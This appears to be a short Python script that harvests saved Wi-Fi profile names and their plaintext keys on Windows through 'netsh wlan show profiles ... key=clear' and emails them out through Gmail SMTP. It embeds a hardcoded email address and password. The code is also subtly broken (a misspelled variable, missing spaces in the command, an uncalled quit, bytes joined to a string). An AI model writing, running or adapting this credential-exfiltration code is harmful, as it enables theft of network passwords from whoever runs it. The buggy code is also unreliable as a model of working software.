import smtplib ,subprocess,re

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit

raw_output = subprocess.check_output("netsh wlan show profiles",shell = True)
networks_list = re.findall("(?:profile\s*:\s)(\w*)",rawouput)
message = ""
for i in networks_list:
    output = subprocess.check_output("netsh wlan show profiles" + i + "key=clear",shell=True)
    message = message + output




send_mail("virutyagi9@gmail.com","VIru@999",message)
